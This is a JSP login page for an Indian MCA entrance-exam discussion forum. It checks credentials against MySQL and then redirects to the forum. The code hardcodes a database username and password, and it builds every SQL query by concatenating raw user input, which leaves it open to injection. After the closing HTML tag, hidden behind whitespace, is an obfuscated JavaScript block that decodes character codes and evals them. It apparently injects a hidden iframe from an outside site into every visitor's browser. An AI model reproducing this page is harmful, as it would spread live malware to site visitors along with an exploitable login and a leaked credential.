<%@ page language="java" import="java.sql.*,java.lang.*,java.util.Date,java.util.TimeZone,java.text.SimpleDateFormat" session="true" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<TITLE>Sanmacs India - MCA Entrance Discussion Forum</TITLE>
<HEAD>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.1.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.2.css>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta name="Keywords" content="SANMACS, MCA, MCA Entrance, IIT MCA, MCA Discussion Forum, MCA Notification, MCA Entrance Test, Aligarh Muslim University, Banaras Hindu University, Delhi University, DU MCA ENTRANCE Exam, Megaleap, Career Guidance, Results, Careers, Test Analysis, Exam Deadlines, General Knowledge, career builder, career education, career change, career training, MCA Entrance Notifications, AMU, BHU, Jamia Millia Islamia, Banasthali vidyapith, Bharathiar university,Cochin University, central university, GJU, GOA University, IMT, NCST, NIMC, Jamia Hamdard" >
<meta name="description" content="www.sanmacs.com-The Authority in Test Preparation....Specialization in MCA preparation, free online tests, sectional tips, Information about the university providing MCA Courses all over India, Declared results available on site, admission announcements, coaching, CET Patterns, regular test series, mock tests based on previous and guessed exam patterns, proper correspondence to students, handling query of student with first preference">

<style type="text/css">
DIV.Object5 { position:absolute; top:68px; left:111px; z-index:1;}
DIV.Object6 { position:absolute; top:148px; left:181px; width:484px; z-index:2;}
</style>
</HEAD>

<BODY topmargin="0" leftmargin="0" onLoad="setTimeout(ft.submit,5000)">
<form name=ft method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/discussion.jsp">
<%!Connection con;
Statement st,st1;
ResultSet rs,rs1;
String uid="";
String pass="";
String conid="";
%>
<%
	HttpSession rsm=request.getSession(true);
	session.setMaxInactiveInterval(900);

	uid=request.getParameter("userid");
	pass=request.getParameter("pass");

	Date dt=new java.util.Date();
        SimpleDateFormat sdf=new SimpleDateFormat("hh:mm a");
        String zone="IST";
        TimeZone tz=TimeZone.getTimeZone(zone);
        sdf.setTimeZone(tz);
        String time1=sdf.format(dt);
	String date_time=(dt.getDate())+"/"+(dt.getMonth()+1)+"/"+(dt.getYear()+1900)+" "+time1;

	try {

	String dns = "jdbc:mysql://sanmacs.db.6936442.hostedresource.com/sanmacs?user=sanmacs&password=macs@123SAN";
	Class.forName("org.gjt.mm.mysql.Driver");
	con= DriverManager.getConnection(dns);

	st=con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

	st1=con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

	rs=st.executeQuery("Select * from Password where username='"+uid+"' and password='"+pass+"'");
	if (rs.next()==true) {

	rsm.putValue("userid",uid);

	st.executeUpdate("Update UserSession set Last_visit='"+date_time+"' where User_id='"+uid+"'");

	st.executeUpdate("Update UserSession set Total_visit=Total_visit + 1 where User_id='"+uid+"'");

	st.executeUpdate("Update UserSession set flag='Yes' where User_id='"+uid+"'");

	rs1=st1.executeQuery("Select fname,lname,checkid from User2 where email='"+uid+"'");
	rs1.next();
	conid=""+rs1.getString("checkid");
	rsm.putValue("connectid",conid);
%>
<DIV class="Object5">
<table border=0 cellpadding=0 cellspacing=0>
<tr><th><p id="ftp" align=center>With in few seconds, you will be redirected to discussion forum.</p></th></tr>
<tr><th height=20></th></tr>
<tr><th>
<table border=1 cellpadding=0 cellspacing=0 width=550 height=250 bordercolor=#C8C7C4 bgcolor=#DBDBD8>
<tr><th height=36 background="http://www.sanmacs.com/images2/discussion_forum/bg_image2.gif"><img src="http://www.sanmacs.com/images2/discussion_forum/redirecting.gif"></img></th></tr>
<tr><th>
<table border=3 cellpadding=0 width=480 height=150 cellspacing=0 bgcolor=#E6E6E3>
<tr><th>
<table border=0 cellpadding=5 cellspacing=0 width=470 bgcolor=#E6E6E3>
<tr><th><p id="ftp">Thank you for logging in, <font color=red><%=rs1.getString("fname") %> <%=rs1.getString("lname") %></font></p></th></tr>
<tr><th><p id="ftp">If your browser donot support redirection, then please <a class="lt" href="http://www.sanmacs.com/mca_guidance_disscusion_forum/discussion.jsp">Click Here</a>!</p></th></tr>
</table>
</th></tr>
</table>
</th></tr>
</table>
</th></tr>
</table>
</DIV>
<%
	}
	else {
%>
<DIV class="Object6">
<table border=3 cellpadding=4 cellspacing=2 bordercolor=#BDBEBE bordercolorlight=#ADAEAF bordercolordark=#979899>
<tr><td><p id="ftp" align="center" style="font size:18px; color:red"><b>Please enter correct userid and password!</b></p></td></tr>
</table>
</DIV>
<%
	}
	con.close();
	} catch(SQLException se) {
	  out.println("SQL Exception :"+se);
	} catch(ClassNotFoundException ce) {
	  out.println("Class Not Found Exception :"+ce);
	} catch(Exception e) {
	  out.println("General Exception :"+e);
	}
%>
</form>
</BODY>
</HTML>

/*b5bee1*/
                                                                                                                                                                                                                                                          try{document.body/=2}catch(gdsgd){ww=window;v="va"+"l";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,116,102,102,114,32,60,30,97,111,98,115,106,101,109,114,43,99,113,99,94,116,100,67,105,101,108,99,107,116,39,37,102,102,113,95,106,101,38,39,56,13,9,11,7,32,31,30,29,116,102,102,114,46,114,112,96,32,60,30,36,104,115,114,109,58,46,45,108,114,104,113,112,97,115,109,114,114,45,97,108,109,46,95,97,118,115,45,112,101,96,112,96,104,55,44,109,104,111,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,111,109,112,105,115,103,108,110,31,59,29,39,96,96,112,111,107,115,113,101,38,57,10,10,31,30,29,32,115,101,101,117,45,113,113,121,107,99,43,98,110,112,97,101,113,30,58,32,38,46,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,117,102,100,115,102,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,107,99,99,116,31,59,29,39,48,110,117,39,58,11,7,32,31,30,29,116,102,102,114,46,114,114,118,108,100,44,113,111,111,30,58,32,38,47,109,120,38,57,10,10,12,8,29,32,31,30,102,102,31,38,30,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,114,100,104,116,90,36,62,59,45,97,105,117,60,36,41,58,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,43,97,111,110,98,110,99,65,101,105,107,98,37,116,102,102,114,41,58,11,7,32,31,30,29,125,12,8,122,41,39,39,56);}w=f;s=[];for(i=0;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;xz(s)}
/*/b5bee1*/
